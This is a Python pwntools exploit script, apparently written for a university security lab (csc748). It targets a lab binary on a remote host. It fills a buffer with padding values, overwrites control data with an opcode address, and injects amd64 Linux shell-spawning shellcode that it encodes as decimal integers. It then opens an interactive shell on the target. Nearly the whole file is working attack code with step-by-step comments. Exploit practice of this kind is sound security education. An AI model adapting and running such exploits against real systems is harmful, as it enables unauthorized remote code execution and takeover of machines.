from pwn import *

context.arch = "x86_64"         # Set the architecture to x86_64

''' Define Constants '''
OP_LOC = 4199382                # Opcode Address 0x4013d6 = (4199382)
BUFFER_SIZE = 8                 # Set buffer size
SHELLCODE = asm(shellcraft.
                amd64.
                linux.
                sh())           # Generate shellcode

BLANK = b"0"                    # 0: filler
EXIT = b"-1 "                   # -1: console exit key


#
# Function:     input_conversion(shell_raw)
#
# Purpose:      Convert shellcode bytes to a list of decimal values
#
# Parameters:   shell_raw (bytes): The raw shellcode in bytes
#
# Returns:      list: A list of decimal values representing the shellcode
#
def input_conversion(shell_raw):
    """ Function Initialization """
    # Initialize Variables
    block_size = 8              # Set block_size to 8 bytes
    block_reversed_list = []

    """ Convert to Hex """
    # Convert bytes to a string
    shell_str = shell_raw.decode('unicode_escape')

    # Convert to 8 byte Hex Value
    for i in range(0, len(shell_str), block_size):      # loop through String by blocks
        block = shell_str[i:i + block_size]             # extract block
        block_reversed = block[::-1]                    # reverse order of characters
        block_reversed_hex = block_reversed.encode('latin-1').hex()     # convert to hex

        # Add Leading Zeros if Less than 8 bytes (16 characters)
        block_reversed_hex = '0' * \
                             (16 - len(block_reversed_hex)) + \
                             block_reversed_hex

        block_reversed_list.append(block_reversed_hex)  # Append the reversed block to the list

    """ Split into 4 byte Blocks """
    block_split_list = []

    # Split and Swap Order
    for each_half in block_reversed_list:
        half1 = each_half[:len(each_half) // 2]     # grab first 4 bytes
        half2 = each_half[len(each_half) // 2:]     # grab second 4 bytes
        block_split_list.extend([half2, half1])     # swap and save

    """ Split Blocks and Convert to Decimal """
    shell_decimal = []

    for each_item in block_split_list:
        decimal_value = int(each_item, 16)          # convert to decimal
        shell_decimal.append(decimal_value)         # append to list

    return shell_decimal                            # Return shellcode decimal representation 


#
# Function:     main()
#
# Purpose:      Main entry point of the program
#

if __name__ == '__main__':
    ''' Establish Connection '''
    p = remote("csc748.hostbin.org", 7023)          # Test Script Against Server
    # p = process("./2-3_lab.bin")                  # Uncomment to Test Script Locally
    # p = gdb.debug("./2-3_lab.bin")                # Uncomment to debug GDB

    ''' Initialize Variables '''
    # Define Buffer Filler Values
    buff_filler = [2863311530, 3149642683]          # 0xaaaaaa and 0xbbbbbbbb in decimal

    # Convert shellcode to list of decimal values
    shell_converted = input_conversion(SHELLCODE)

    ''' Exploit Vulnerability '''
    # Exploit Format:
    #       <buffer fill>*136 + <op code> + <shell code> + <exit code>
    # #

    # Send Buffer Fill
    for x in range(BUFFER_SIZE - 1):
        for each in buff_filler:
            p.sendline(str(each).encode())

    # Send Opcode
    p.sendline(str(OP_LOC).encode())                # Send the opcode location as bytes
    p.sendline(BLANK)                               # Send 0 to fill remaining bytes

    # Send Shellcode
    for each_value in shell_converted:
        p.sendline(str(each_value).encode())

    # Send exit code
    p.sendline(EXIT)

    # Start Interactive Session
    p.interactive()


